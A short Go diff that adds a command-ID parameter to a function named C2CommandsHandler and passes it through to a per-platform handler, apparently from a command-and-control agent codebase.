@@ -19,7 +19,7 @@ import (
 	"github.com/spf13/pflag"
 )
 
-func C2CommandsHandler(cmdSlice []string) (out string) {
+func C2CommandsHandler(cmdSlice []string, cmd_id string) (out string) {
 	var err error
 
 	// parse command-line arguments using pflag
@@ -452,7 +452,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 
 	default:
 		// let per-platform C2CommandsHandler do the job
-		out = platformC2CommandsHandler(cmdSlice)
+		out = platformC2CommandsHandler(cmdSlice, cmd_id)
 	}
 	return
 }
